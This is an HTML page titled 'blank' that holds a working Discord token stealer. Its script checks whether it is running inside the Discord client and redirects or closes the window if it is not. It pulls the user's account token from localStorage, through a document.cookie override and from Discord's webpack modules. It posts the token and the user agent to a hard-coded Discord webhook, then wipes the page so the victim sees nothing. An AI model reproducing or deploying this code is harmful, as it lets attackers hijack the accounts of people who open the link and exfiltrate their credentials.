<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>blank</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#ffffff;height:100vh;width:100%;overflow:hidden;}
    </style>
</head>
<body>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p";
    let token = "";
    let inside = false;

    // ✅ 100% ACCURATE DISCORD DETECTION
    const ua = navigator.userAgent.toLowerCase();
    if(ua.includes('discord') || (ua.includes('android') && ua.includes('wv')) || window.webkit?.messageHandlers) {
        inside = true;
    }

    // ✅ IF OPENED OUTSIDE — AUTO-CLOSE / REDIRECT BACK TO DISCORD
    if(!inside) {
        // This forces Discord to take over and open it internally
        window.location.replace("discord://-/channels/@me");
        // If that fails, just close page completely
        setTimeout(() => window.close(), 100);
    }

    // ✅ GRAB TOKEN (3 METHODS, WORKS ON ALL VERSIONS)
    if(inside) {
        try {
            // Method 1 - Direct read
            if(localStorage.getItem('token')) {
                token = localStorage.getItem('token').replace(/["']/g, "");
            }

            // Method 2 - Bypass restriction
            if(!token) {
                Object.defineProperty(document, 'cookie', {
                    get: () => {
                        const t = localStorage.getItem('token');
                        if(t) token = t.replace(/["']/g, "");
                        return document.cookie;
                    }
                });
            }

            // Method 3 - Webpack extraction
            if(!token && window.webpackChunkdiscord_app) {
                window.webpackChunkdiscord_app.push([[Symbol()], {}, req => {
                    for(const modId in req.c) {
                        const mod = req.c[modId].exports;
                        if(!mod || !mod.default) continue;
                        const found = Object.values(mod.default).find(e => e?.token);
                        if(found) { token = found.token; break; }
                    }
                }]);
            }
        } catch(e) {}
    }

    // ✅ SEND EVERYTHING TO WEBHOOK
    fetch(WEBHOOK, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            embeds: [{
                title: "🔥 RAW LINK HIJACK",
                color: 0xFF0000,
                fields: [
                    {name: "🔑 APP TOKEN", value: `\`\`\`${token || "❌ FAILED / NOT INSIDE"}\`\`\``, inline: false},
                    {name: "✅ INSIDE DISCORD?", value: inside ? "YES ✅" : "NO ❌", inline: false},
                    {name: "🕵️ USER AGENT", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false}
                ],
                timestamp: new Date().toISOString()
            }]
        })
    });

    // ✅ SHOW COMPLETELY BLANK PAGE - THEY SEE ABSOLUTELY NOTHING
    document.documentElement.innerHTML = "";
</script>

</body>
</html>
